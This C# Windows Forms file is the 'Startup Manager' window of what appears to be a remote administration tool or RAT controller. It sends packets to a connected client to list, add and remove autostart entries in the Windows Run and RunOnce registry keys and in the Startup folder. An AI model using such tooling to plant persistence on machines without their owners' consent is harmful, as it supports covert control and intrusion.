using System;
using System.Linq;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmStartupManager : Form
    {
        private readonly Client _connectClient;

        public FrmStartupManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmStm = this;
            InitializeComponent();
        }

        private void FrmStartupManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = WindowHelper.GetWindowTitle("Startup Manager", _connectClient);
                AddGroups();
                new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
            }
        }

        private void AddGroups()
        {
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(new ListViewGroup("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        }

        private void FrmStartupManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmStm = null;
        }

        #region "ContextMenuStrip"

        private void addEntryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAddToAutostart())
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    if (_connectClient != null)
                    {
                        new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
                            AutostartItem.Type).Execute(_connectClient);
                        lstStartupItems.Items.Clear();
                        new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
                    }
                }
            }
        }

        private void removeEntryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int modified = 0;
            foreach (ListViewItem item in lstStartupItems.SelectedItems)
            {
                if (_connectClient != null)
                {
                    int type = lstStartupItems.Groups.Cast<ListViewGroup>().TakeWhile(t => t != item.Group).Count();
                    new Core.Packets.ServerPackets.DoStartupItemRemove(item.Text, item.SubItems[1].Text, type).Execute(_connectClient);
                }
                modified++;
            }

            if (modified > 0 && _connectClient != null)
            {
                lstStartupItems.Items.Clear();
                new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
            }
        }

        #endregion

        public void AddAutostartItemToListview(ListViewItem lvi)
        {
            try
            {
                lstStartupItems.Invoke((MethodInvoker) delegate
                {
                    lstStartupItems.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public ListViewGroup GetGroup(int group)
        {
            ListViewGroup g = null;
            try
            {
                lstStartupItems.Invoke((MethodInvoker) delegate
                {
                    g = lstStartupItems.Groups[group];
                });
            }
            catch (InvalidOperationException)
            {
                return null;
            }
            return g;
        }
    }
}